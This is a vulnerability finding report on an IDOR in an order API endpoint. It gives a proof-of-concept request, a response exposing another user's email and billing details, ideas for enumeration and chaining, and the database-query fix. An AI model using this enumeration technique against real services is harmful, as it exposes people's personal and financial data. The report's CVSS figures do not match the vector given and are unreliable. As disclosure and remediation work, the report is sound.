# Finding: IDOR on /api/v1/orders/{id} — Cross-Account Order Data Exposure

## Request

```http
GET /api/v1/orders/7845 HTTP/1.1
Host: api.example.com
Authorization: Bearer ATTACKER_JWT_TOKEN
Accept: application/json
```

## Response

```json
{
  "order_id": 7845,
  "user": {
    "id": 9002,
    "email": "victim@example.com",
    "name": "Jane Smith"
  },
  "items": [{"sku": "PROD-123", "qty": 2, "price": 49.99}],
  "total": 99.98,
  "billing": {
    "address": "123 Main St, New York, NY 10001",
    "card_last4": "4242",
    "card_brand": "Visa"
  }
}
```

## Expected Response

```http
HTTP/1.1 403 Forbidden
{"error": "You do not have permission to access this order."}
```

## Impact

Any authenticated user can enumerate sequential order IDs to access order details (including billing address and payment method last-4) for all other users. With 10,000 requests using `ffuf`, an attacker can enumerate months of order data across the platform.

CVSS 3.1: `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` = **7.5 High** (no write access)
Upgraded to **8.1** accounting for financial data (billing address + card info).

## Chain Potential

No password reset token exposed — no direct ATO chain. However the leaked email addresses could be used for targeted phishing or credential stuffing. If combined with a CORS misconfiguration on this endpoint, exploitation becomes zero-click from a malicious page.

## Remediation Applied (after fix)

Developer added `WHERE order_id = ? AND user_id = ?` to the database query, scoping all order lookups to the authenticated user.
